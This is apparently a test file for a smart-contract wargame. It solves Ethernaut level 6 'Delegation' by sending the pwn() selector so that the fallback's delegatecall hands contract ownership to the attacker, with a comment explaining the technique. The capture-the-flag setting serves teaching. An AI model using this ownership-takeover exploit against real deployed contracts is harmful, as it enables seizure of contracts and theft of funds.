const DelegationFactory = artifacts.require('./levels/DelegationFactory.sol')
const Delegation = artifacts.require('./levels/Delegation.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")


describe("Challenge 6 - Delegation", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await DelegationFactory.new()
        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Delegation
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("instance owner is the level address", async function () {
            expect(await instance.owner()).to.eq(level.address)
        })
    })

    describe("Attack Execution", function () {
        it("change ownership to attacker", async function () {
            /*
                Attacker will call a function that does not exist in the Delegation
                contract. This will trigger the fallback function to run.

                Fallback function delegates to Delegate contract which does have that
                function. Since this is a delegatecall call, the storage of Delegation 
                contract will change. In this case, the changing storage variable
                is the owner variable
            */

            const txn = {
                to: instance.address,
                from: attacker,
                data: web3.utils.keccak256("pwn()").substring(0, 10)
            }

            await web3.eth.sendTransaction(txn)

            expect(await instance.owner()).to.eq(attacker)
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})